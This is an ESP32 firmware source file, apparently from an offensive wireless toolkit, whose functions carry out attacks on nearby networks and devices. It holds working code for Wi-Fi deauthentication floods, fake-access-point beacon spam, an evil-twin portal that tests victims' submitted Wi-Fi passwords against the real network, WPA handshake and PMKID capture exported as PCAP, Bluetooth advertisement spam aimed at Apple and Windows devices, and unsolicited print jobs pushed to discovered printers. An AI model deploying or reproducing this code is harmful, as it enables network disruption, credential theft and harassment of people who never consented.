#include "attacks.h"
#include "web_interface.h"

// LED control variables
unsigned long lastBlueBlink = 0;
bool blueState = false;

// Printer attack variables
bool printerAttackActive = false;
String discoveredPrinters = "";
String printerMessage = "";

// Beacon packet definition moved from config.h
uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

void initLEDs() {
  pinMode(RED_LED, OUTPUT);
  pinMode(BLUE_LED, OUTPUT);
  digitalWrite(RED_LED, HIGH);  // Red LED on (idle state)
  digitalWrite(BLUE_LED, LOW);  // Blue LED off
}

void updateLEDs() {
  bool anyAttackActive = attackActive || evilActive || sourAppleActive || 
                        combinedActive || windowsBluetoothActive || 
                        handshakeCapture || aggressiveHandshake || 
                        beaconSpamActive || printerAttackActive;
  
  if (anyAttackActive) {
    digitalWrite(RED_LED, LOW);  // Turn off red LED
    
    // Blink blue LED at medium speed (500ms interval)
    if (millis() - lastBlueBlink >= 500) {
      blueState = !blueState;
      digitalWrite(BLUE_LED, blueState ? HIGH : LOW);
      lastBlueBlink = millis();
    }
  } else {
    digitalWrite(RED_LED, HIGH);   // Red LED on (idle)
    digitalWrite(BLUE_LED, LOW);   // Blue LED off
  }
}

NimBLEAdvertisementData getSourAppleData() {
  static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
  static uint8_t packet[17] = {16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1};
  
  packet[7] = types[esp_random() % 11];
  esp_fill_random(&packet[8], 3);
  packet[11] = 0x00;
  packet[12] = 0x00; 
  packet[13] = 0x10;
  esp_fill_random(&packet[14], 3);
  
  NimBLEAdvertisementData adData;
  adData.addData(packet, 17);
  return adData;
}

void sourAppleTask(void* param) {
  NimBLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  
  NimBLEServer *pServer = NimBLEDevice::createServer();
  NimBLEAdvertising* pAdvertising = pServer->getAdvertising();
  
  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x20);
  
  while (sourAppleActive) {
    pAdvertising->stop();
    pAdvertising->setAdvertisementData(getSourAppleData());
    pAdvertising->start();
    delay(100);
  }
  
  pAdvertising->stop();
  NimBLEDevice::deinit();
  vTaskDelete(NULL);
}

void startSourApple() {
  if (sourAppleActive) return;
  sourAppleActive = true;
  xTaskCreate(sourAppleTask, "SourApple", 8192, NULL, 5, NULL);
  Serial.println("Rapid Sour Apple attack started");
}

void stopSourApple() {
  if (!sourAppleActive) return;
  sourAppleActive = false;
  Serial.println("Sour Apple attack stopped");
}

void windowsBluetoothTask(void* param);

NimBLEAdvertisementData getWindowsBluetoothData() {
  NimBLEAdvertisementData advertisementData = NimBLEAdvertisementData();
  advertisementData.setFlags(0x06); // GENERAL_DISC_MODE | BR_EDR_NOT_SUPPORTED

  // Microsoft Swift Pair specific advertisement
  uint8_t swiftPairPayload[] = {
    0x03, // Length of this section
    0x03, // Service UUID
    0x83, 0x18, // Swift Pair Service
    
    0x08, // Length of this section
    0xFF, // Manufacturer Specific Data
    0x06, 0x00, // Microsoft Company ID
    0x03, 0x00, 0x80, // Microsoft Beacon, Subtype, Swift Pair flag
    0x00 // RSSI
  };
  advertisementData.addData(swiftPairPayload, sizeof(swiftPairPayload));

  return advertisementData;
}

void windowsBluetoothTask(void* param) {
  Serial.println("Rapid Windows Bluetooth attack task started");
  
  NimBLEDevice::init("");
  
  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
  if (!pAdvertising) {
    Serial.println("Failed to get advertising object");
    vTaskDelete(NULL);
    return;
  }
  
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  
  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x30);

  const char* deviceNames[] = {
    "Surface Headphones", "Surface Earbuds", "Xbox Controller",
    "Surface Mouse", "Surface Keyboard", "Surface Pen",
    "MX Master 3", "WH-1000XM5", "Bose QC Earbuds"
  };

  while (windowsBluetoothActive) {
    // Stop any existing advertisement
    pAdvertising->stop();
    delay(50);
    
    // Set new advertisement data
    NimBLEAdvertisementData adData = getWindowsBluetoothData();
    String deviceName = deviceNames[esp_random() % 9];
    adData.setName(deviceName.c_str());
    pAdvertising->setAdvertisementData(adData);

    // Start advertisement
    pAdvertising->start();
    delay(200);
  }

  pAdvertising->stop();
  Serial.println("Windows Bluetooth attack task stopped");
  vTaskDelete(NULL);
}

void startWindowsBluetooth() {
  if (windowsBluetoothActive) return;
  windowsBluetoothActive = true;
  // Create a new task for the attack to run continuously in the background
  xTaskCreate(windowsBluetoothTask, "WinBTSpam", 8192, NULL, 5, NULL);
}

void stopWindowsBluetooth() {
  if (!windowsBluetoothActive) return;
  windowsBluetoothActive = false;
  // The task will see the flag change, stop itself, and clean up.
  Serial.println("Stopping Windows Bluetooth attack...");
}

struct HandshakeData {
  uint8_t ap_mac[6];
  uint8_t sta_mac[6];
  uint8_t anonce[32];
  uint8_t snonce[32];
  uint8_t pmkid[16];
  bool has_pmkid;
  bool has_msg1;
  bool has_msg2;
  bool has_msg3;
  bool has_msg4;
  uint32_t timestamp;
};

HandshakeData currentHandshake;

bool isTargetMAC(const uint8_t* mac) {
  if (targetBSSID[0] == 0 && targetBSSID[1] == 0 && targetBSSID[2] == 0) return true;
  return memcmp(mac, targetBSSID, 6) == 0;
}

bool parseEAPOL(const uint8_t* data, uint16_t len) {
  if (len < 99) return false;
  
  // Check for 802.11 data frame with EAPOL
  if ((data[0] & 0x0C) != 0x08) return false; // Must be data frame
  if (data[32] != 0x88 || data[33] != 0x8E) return false; // EAPOL EtherType
  if (data[35] != 0x03) return false; // EAPOL-Key
  
  uint8_t* ap_mac = (uint8_t*)&data[16];
  uint8_t* sta_mac = (uint8_t*)&data[10];
  
  if (!isTargetMAC(ap_mac)) return false;
  
  // Parse key information
  uint16_t key_info = (data[39] << 8) | data[40];
  bool pairwise = (key_info & 0x0008) != 0;
  bool install = (key_info & 0x0040) != 0;
  bool ack = (key_info & 0x0080) != 0;
  bool mic = (key_info & 0x0100) != 0;
  
  if (!pairwise) return false; // Only want pairwise keys
  
  // Determine message type
  if (ack && !mic && !install) {
    // Message 1
    memcpy(currentHandshake.ap_mac, ap_mac, 6);
    memcpy(currentHandshake.sta_mac, sta_mac, 6);
    memcpy(currentHandshake.anonce, &data[51], 32);
    currentHandshake.has_msg1 = true;
    return true;
  } else if (!ack && mic && !install) {
    // Message 2
    if (memcmp(currentHandshake.ap_mac, ap_mac, 6) == 0) {
      memcpy(currentHandshake.snonce, &data[51], 32);
      currentHandshake.has_msg2 = true;
      return true;
    }
  } else if (ack && mic && install) {
    // Message 3
    if (memcmp(currentHandshake.ap_mac, ap_mac, 6) == 0) {
      currentHandshake.has_msg3 = true;
      return true;
    }
  } else if (!ack && mic && !install) {
    // Message 4
    if (memcmp(currentHandshake.ap_mac, ap_mac, 6) == 0) {
      currentHandshake.has_msg4 = true;
      return true;
    }
  }
  
  return false;
}

bool parsePMKID(const uint8_t* data, uint16_t len) {
  if (len < 32) return false;
  
  // Check for association response with PMKID
  if ((data[0] & 0xFC) != 0x10) return false; // Association response
  
  uint8_t* ap_mac = (uint8_t*)&data[16];
  if (!isTargetMAC(ap_mac)) return false;
  
  // Look for PMKID in RSN IE
  for (int i = 36; i < len - 20; i++) {
    if (data[i] == 0x30 && data[i+1] > 20) { // RSN IE
      int rsn_len = data[i+1];
      for (int j = i + 2; j < i + rsn_len - 16; j++) {
        if (data[j] == 0x01 && data[j+1] == 0x00) { // PMKID count
          if (data[j+2] == 0x01 && data[j+3] == 0x00) { // One PMKID
            memcpy(currentHandshake.pmkid, &data[j+4], 16);
            memcpy(currentHandshake.ap_mac, ap_mac, 6);
            memcpy(currentHandshake.sta_mac, &data[10], 6);
            currentHandshake.has_pmkid = true;
            return true;
          }
        }
      }
    }
  }
  return false;
}

IRAM_ATTR void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!handshakeCapture && !aggressiveHandshake) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  
  if (len > 1500 || len < 32) return;
  
  // Try to parse PMKID first (more efficient)
  if (parsePMKID(payload, len)) {
    handshakeCount++;
    handshakeComplete = true;
    Serial.println("PMKID captured! Auto-stopping...");
    return;
  }
  
  // Try to parse EAPOL handshake
  if (parseEAPOL(payload, len)) {
    // Store raw packet for PCAP export
    String hexPacket = "";
    for (int i = 0; i < len; i++) {
      if (payload[i] < 16) hexPacket += "0";
      hexPacket += String(payload[i], HEX);
    }
    
    capturedHandshakes += String(millis()) + ":" + String(len) + ":" + hexPacket + "\n";
    handshakeCount++;
    
    // Check if we have complete 4-way handshake
    if (currentHandshake.has_msg1 && currentHandshake.has_msg2 && 
        currentHandshake.has_msg3 && currentHandshake.has_msg4) {
      handshakeComplete = true;
      Serial.println("Complete 4-way handshake captured! Auto-stopping...");
    }
    
    // Limit memory usage
    if (capturedHandshakes.length() > 50000) {
      int firstNewline = capturedHandshakes.indexOf('\n');
      if (firstNewline > 0) {
        capturedHandshakes = capturedHandshakes.substring(firstNewline + 1);
      }
    }
    
    Serial.println("Handshake packet captured: " + String(handshakeCount));
  }
}

void startHandshakeCapture() {
  if (handshakeCapture) return;
  handshakeCapture = true;
  handshakeStartTime = millis();
  handshakeComplete = false;
  capturedHandshakes = "";
  handshakeCount = 0;
  
  // Initialize handshake structure
  memset(&currentHandshake, 0, sizeof(currentHandshake));
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  const wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
  };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&handshakeSniffer);
  
  Serial.println("Passive handshake/PMKID capture started (80s timeout)");
}

void stopHandshakeCapture() {
  if (!handshakeCapture) return;
  handshakeCapture = false;
  esp_wifi_set_promiscuous(false);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);
  
  Serial.println("Handshake capture stopped. Captured: " + String(handshakeCount));
}

void startAggressiveHandshake() {
  if (aggressiveHandshake || targetSSID == "") return;
  
  aggressiveHandshake = true;
  handshakeComplete = false;
  capturedHandshakes = "";
  handshakeCount = 0;
  
  // Initialize handshake structure
  memset(&currentHandshake, 0, sizeof(currentHandshake));
  
  // Start handshake capture
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
  const wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
  };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&handshakeSniffer);
  
  // Start deauth attack simultaneously
  attackActive = true;
  deauthPkts = 0;
  stations.clear();
  
  Serial.println("Aggressive handshake/PMKID capture started (stops on complete) on: " + targetSSID);
}

void stopAggressiveHandshake() {
  if (!aggressiveHandshake) return;
  
  aggressiveHandshake = false;
  attackActive = false;
  esp_wifi_set_promiscuous(false);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);
  
  Serial.println("Aggressive handshake capture stopped. Captured: " + String(handshakeCount));
}

void clearHandshakes() {
  capturedHandshakes = "";
  handshakeCount = 0;
  handshakeComplete = false;
  memset(&currentHandshake, 0, sizeof(currentHandshake));
  Serial.println("Handshakes cleared");
}

String generatePCAP() {
  String pcap = "";
  
  // PCAP Global Header (24 bytes)
  pcap += (char)0xD4; pcap += (char)0xC3; pcap += (char)0xB2; pcap += (char)0xA1; // Magic number
  pcap += (char)0x02; pcap += (char)0x00; // Version major
  pcap += (char)0x04; pcap += (char)0x00; // Version minor
  pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; // Timezone offset
  pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; // Timestamp accuracy
  pcap += (char)0xFF; pcap += (char)0xFF; pcap += (char)0x00; pcap += (char)0x00; // Max packet length
  pcap += (char)0x7F; pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; // Data link type (IEEE 802.11)
  
  // Parse captured handshakes and add to PCAP
  int start = 0;
  while (start < capturedHandshakes.length()) {
    int end = capturedHandshakes.indexOf('\n', start);
    if (end == -1) break;
    
    String line = capturedHandshakes.substring(start, end);
    int firstColon = line.indexOf(':');
    int secondColon = line.indexOf(':', firstColon + 1);
    
    if (firstColon > 0 && secondColon > firstColon) {
      uint32_t timestamp = line.substring(0, firstColon).toInt();
      uint16_t packetLen = line.substring(firstColon + 1, secondColon).toInt();
      String hexData = line.substring(secondColon + 1);
      
      // PCAP Packet Header (16 bytes)
      pcap += (char)(timestamp & 0xFF); pcap += (char)((timestamp >> 8) & 0xFF);
      pcap += (char)((timestamp >> 16) & 0xFF); pcap += (char)((timestamp >> 24) & 0xFF);
      pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; pcap += (char)0x00; // Microseconds
      pcap += (char)(packetLen & 0xFF); pcap += (char)((packetLen >> 8) & 0xFF);
      pcap += (char)0x00; pcap += (char)0x00; // Captured length
      pcap += (char)(packetLen & 0xFF); pcap += (char)((packetLen >> 8) & 0xFF);
      pcap += (char)0x00; pcap += (char)0x00; // Original length
      
      // Packet data
      for (int i = 0; i < hexData.length(); i += 2) {
        String byteStr = hexData.substring(i, i + 2);
        pcap += (char)strtol(byteStr.c_str(), NULL, 16);
      }
    }
    
    start = end + 1;
  }
  
  return pcap;
}

IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!attackActive && !combinedActive) return;
  if (type != WIFI_PKT_MGMT) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;
  
  if (payload[0] == 0x50 || (payload[0] == 0x00 && payload[1] == 0x00)) {
    uint8_t* stationMac = payload + 10;
    uint8_t* apMac = payload + 16;
    if (memcmp(apMac, targetBSSID, 6) == 0) {
      bool exists = false;
      for (auto& station : stations) {
        if (memcmp(station.mac, stationMac, 6) == 0) {
          station.lastSeen = millis();
          exists = true;
          break;
        }
      }
      if (!exists && stations.size() < MAX_STATIONS) {
        Station newStation;
        memcpy(newStation.mac, stationMac, 6);
        newStation.lastSeen = millis();
        stations.push_back(newStation);
      }
    }
  }
}

void sendDeauthFrame(const uint8_t* destMac, const uint8_t* srcMac, uint8_t frameType) {
  uint8_t packet[26] = {
    frameType, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
  };

  memcpy(&packet[4], destMac, 6);
  memcpy(&packet[10], srcMac, 6);
  memcpy(&packet[16], targetBSSID, 6);
  packet[22] = (seqNum & 0xFF);
  packet[23] = (seqNum >> 8) & 0xFF;
  seqNum = (seqNum + 1) % 4096;

  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
  if (result == ESP_OK) {
    deauthPkts++;
  }
}

void sendDeauthPackets() {
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  
  sendDeauthFrame(broadcast, targetBSSID, 0xC0);
  delay(2);
  sendDeauthFrame(targetBSSID, broadcast, 0xC0);
  delay(2);
  uint8_t fakeClient[6] = {0xDE, 0xAD, 0xBE, 0xEF, random(0xFF), random(0xFF)};
  sendDeauthFrame(targetBSSID, fakeClient, 0xC0);
  delay(2);
  sendDeauthFrame(broadcast, targetBSSID, 0xA0);
  delay(2);
  
  for (auto& station : stations) {
    if (millis() - station.lastSeen < 30000) {
      sendDeauthFrame(station.mac, targetBSSID, 0xC0);
      delay(2);
      sendDeauthFrame(targetBSSID, station.mac, 0xC0);
      delay(2);
    }
  }
}

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;
    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++)
    macAddr[i] = random(256);
}

void startBeaconSpam() {
  if (beaconSpamActive) return;
  beaconSpamActive = true;
  WiFi.mode(WIFI_AP_STA);
  randomMac();
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  Serial.println("Beacon Spam started");
}

void stopBeaconSpam() {
  if (!beaconSpamActive) return;
  beaconSpamActive = false;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);
  Serial.println("Beacon Spam stopped");
}

void sendBeaconSpam() {
  if (!beaconSpamActive) return;
  
  nextChannel();
  
  if (beaconTargetMode && targetSSID.length() > 0) {
    // Mode 1: Create multiple fake APs of selected target
    uint8_t channels[] = {1, 6, 11, 3, 8, 13, 2, 7, 12, 4};
    for (int i = 0; i < 10; i++) {
      macAddr[5] = i + 1;
      memcpy(&beaconPacket[10], macAddr, 6);
      memcpy(&beaconPacket[16], macAddr, 6);
      memcpy(&beaconPacket[38], emptySSID, 32);
      memcpy(&beaconPacket[38], targetSSID.c_str(), (targetSSID.length() < 32) ? targetSSID.length() : 32);
      beaconPacket[82] = channels[i];
      
      for (int k = 0; k < 3; k++) {
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false);
        packetCounter++;
        delay(1);
      }
    }
  } else if (customSSIDs.length() > 0) {
    // Mode 2: Create APs from custom SSID list
    int start = 0;
    int ssidNum = 1;
    
    while (start < customSSIDs.length()) {
      int end = customSSIDs.indexOf('\n', start);
      if (end == -1) end = customSSIDs.length();
      
      String ssid = customSSIDs.substring(start, end);
      ssid.trim();
      
      if (ssid.length() > 0) {
        macAddr[5] = ssidNum++;
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);
        memcpy(&beaconPacket[38], emptySSID, 32);
        memcpy(&beaconPacket[38], ssid.c_str(), (ssid.length() < 32) ? ssid.length() : 32);
        beaconPacket[82] = wifi_channel;
        
        for (int k = 0; k < 3; k++) {
          esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false);
          packetCounter++;
          delay(1);
        }
      }
      
      start = end + 1;
    }
  }
}

String evilCheckPassword(const String& pass) {
  WiFi.begin(targetSSID.c_str(), pass.c_str(), targetChannel, targetBSSID);
  unsigned long startTime = millis();
  bool connected = false;
  
  while (millis() - startTime < 8000) {
    if (WiFi.status() == WL_CONNECTED) {
      connected = true;
      break;
    }
    delay(500);
    Serial.println("Verifying password...");
  }
  
  if (connected) {
    validPass = targetSSID + ":" + pass;
    evilActive = false;
    combinedActive = false;
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
    dnsServer.start(DNS_PORT, "*", APIP);
    Serial.println("Valid Password Found: " + validPass);
    return htmlHeader("Success") + "<div class=container><div class=card><h3>Success</h3><p>Login successful. Network access granted.</p></div></div>" + htmlFooter();
  }
  
  WiFi.disconnect(false);
  Serial.println("Invalid Password Attempt: " + pass);
  return evilIndex("Authentication failed. Please try again.");
}

void startAttack() {
  if (targetSSID == "") return;
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
  const wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  attackActive = true;
  deauthPkts = 0;
  stations.clear();
  Serial.println("Attack started on " + targetSSID);
}

void stopAttack() {
  attackActive = false;
  esp_wifi_set_promiscuous(false);
  dnsServer.start(DNS_PORT, "*", APIP);
  Serial.println("Attack stopped");
}

void startEvil() {
  if (targetSSID == "") return;
  evilActive = true;
  WiFi.softAP(targetSSID.c_str(), nullptr, targetChannel);
  Serial.println("Evil Twin started on: " + targetSSID);
}

void stopEvil() {
  evilActive = false;
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);
  Serial.println("Evil Twin stopped");
}

void deauthTask(void* param) {
  while (combinedActive) {
    if (WiFi.getMode() == WIFI_AP_STA) {
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
      sendDeauthFrame(broadcast, targetBSSID, 0xC0);
      delay(100);
      sendDeauthFrame(targetBSSID, broadcast, 0xC0);
      delay(100);
      for (auto& station : stations) {
        if (millis() - station.lastSeen < 30000) {
          sendDeauthFrame(station.mac, targetBSSID, 0xC0);
          delay(50);
        }
      }
      deauthPkts += 3;
    }
    delay(500);
  }
  vTaskDelete(NULL);
}

void startCombined() {
  if (targetSSID == "") return;
  combinedActive = true;
  WiFi.mode(WIFI_AP_STA);
  
  WiFi.softAP(targetSSID.c_str(), nullptr, targetChannel);
  dnsServer.start(DNS_PORT, "*", APIP);
  
  esp_wifi_set_promiscuous(true);
  const wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  deauthPkts = 0;
  stations.clear();
  
  // Increased stack size and proper task creation
  xTaskCreatePinnedToCore(deauthTask, "DeauthTask", 8192, NULL, 2, &deauthTaskHandle, 0);
  
  Serial.println("Combined Attack (Evil Twin + Deauth) started on: " + targetSSID);
}

void stopCombined() {
  combinedActive = false;
  
  // Wait for task to finish and clean up
  if (deauthTaskHandle != NULL) {
    delay(100); // Give task time to exit
    deauthTaskHandle = NULL;
  }
  
  WiFi.softAPdisconnect(true);
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);
  Serial.println("Combined Attack stopped");
}

// Network Printer Attack Functions
bool connectToNetwork(String ssid, String password) {
  Serial.println("Connecting to network: " + ssid);
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid.c_str(), password.c_str());
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected! IP: " + WiFi.localIP().toString());
    return true;
  } else {
    Serial.println("\nFailed to connect to network");
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
    dnsServer.start(DNS_PORT, "*", APIP);
    return false;
  }
}

void scanNetworkPrinters() {
  if (!WiFi.isConnected()) {
    Serial.println("Not connected to network");
    discoveredPrinters = "Error: Not connected to network";
    return;
  }
  
  discoveredPrinters = "";
  IPAddress localIP = WiFi.localIP();
  String subnet = String(localIP[0]) + "." + String(localIP[1]) + "." + String(localIP[2]) + ".";
  
  Serial.println("Scanning subnet: " + subnet + "1-254");
  Serial.println("Scanning for network printers...");
  
  int found = 0;
  for (int i = 1; i < 255; i++) {
    String targetIP = subnet + String(i);
    WiFiClient client;
    
    // Check common printer ports with timeout
    client.setTimeout(1000);
    if (client.connect(targetIP.c_str(), 9100) || 
        client.connect(targetIP.c_str(), 515) || 
        client.connect(targetIP.c_str(), 631)) {
      discoveredPrinters += targetIP + "\n";
      Serial.println("Printer found: " + targetIP);
      found++;
      client.stop();
    }
    delay(10);
    
    // Progress indicator
    if (i % 50 == 0) {
      Serial.println("Scanned " + String(i) + "/254 addresses...");
    }
  }
  
  if (found == 0) {
    discoveredPrinters = "No printers found on network " + subnet + "0/24";
  } else {
    Serial.println("Found " + String(found) + " printer(s)");
  }
  Serial.println("Printer scan complete");
}

void printToPrinter(String printerIP, String message) {
  WiFiClient client;
  
  // Try RAW printing on port 9100 first
  if (client.connect(printerIP.c_str(), 9100)) {
    String printJob = "\x1B%-12345X@PJL\r\n";
    printJob += "@PJL JOB NAME=\"Security Test\"\r\n";
    printJob += "@PJL ENTER LANGUAGE=PCL\r\n";
    printJob += "\x1BE\x1B&l0O\x1B&l0E";
    printJob += "\x1B&k2G\x1B(s0p16.66h8.5v0s0b3T";
    printJob += message + "\r\n\r\n";
    printJob += "\x1BE\x1B%-12345X";
    
    client.print(printJob);
    client.stop();
    Serial.println("Print job sent to " + printerIP + " (RAW)");
    return;
  }
  
  // Try IPP on port 631
  if (client.connect(printerIP.c_str(), 631)) {
    String ippRequest = "POST /ipp/print HTTP/1.1\r\n";
    ippRequest += "Host: " + printerIP + ":631\r\n";
    ippRequest += "Content-Type: application/ipp\r\n";
    ippRequest += "Content-Length: " + String(message.length() + 50) + "\r\n\r\n";
    
    client.print(ippRequest);
    client.print(message);
    client.stop();
    Serial.println("Print job sent to " + printerIP + " (IPP)");
    return;
  }
  
  Serial.println("Failed to connect to printer: " + printerIP);
}

void startPrinterAttack() {
  if (printerAttackActive) return;
  
  if (!WiFi.isConnected()) {
    Serial.println("Error: Not connected to any network. Connect first.");
    return;
  }
  
  printerAttackActive = true;
  printerMessage = "SECURITY TEST - Unauthorized network access detected!\nPrinter: " + WiFi.localIP().toString() + "\nTime: " + String(millis()/1000) + "s";
  
  Serial.println("Network Printer Attack started");
  scanNetworkPrinters();
}

void stopPrinterAttack() {
  if (!printerAttackActive) return;
  printerAttackActive = false;
  Serial.println("Network Printer Attack stopped");
}
